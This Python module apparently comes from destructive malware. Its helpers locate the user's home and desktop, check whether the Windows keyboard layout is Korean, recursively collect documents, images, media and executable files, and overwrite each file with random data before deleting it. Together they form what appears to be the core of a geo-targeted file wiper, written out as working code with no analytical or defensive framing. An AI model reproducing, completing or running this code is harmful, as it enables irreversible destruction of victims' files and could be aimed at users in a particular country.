import os
import ctypes
import string
import random

def get_home_path():
    return os.path.expanduser('~')

def get_desktop_path():
    path = os.path.join(os.path.expanduser('~'), '/Desktop/')

    if os.path.isdir(path):
        pass
    else:
        path = os.path.expanduser('~') + '/Desktop/'

    return path

def is_korea():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    layout_id = user32.GetKeyboardLayout(0)
    language_id = hex(layout_id & (2**16 - 1))

    if language_id == '0x412':
        return True
    else:
        return False

def find_files(path):
    file_format = {'.doc': 0, '.docx': 0, '.xls': 0, '.xlsx': 0, '.ppt': 0, '.pptx': 0, '.jpg': 0,
    '.jpeg':0, '.bmp': 0, '.png': 0, '.gif': 0, '.mp3': 0, '.avi': 0, '.mp4': 0, '.exe': 0}

    files = []
    for file_path, directories, found_files in os.walk(path):
        for file in found_files:
            extension = os.path.splitext(os.path.join(file_path, file))[1].lower()

            if(file_format.get(extension) == 0 or extension == ''):
                files.append(os.path.join(file_path, file))
    return files

def destroy_file(filename, passes=1):
    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(filename):
        return False

    filesize = os.path.getsize(filename)

    with open(filename, 'w') as f:
        for _ in range(int(passes)):
            data = generate_data(filesize)
            f.write(data)
            f.seek(0, 0)

    os.remove(filename)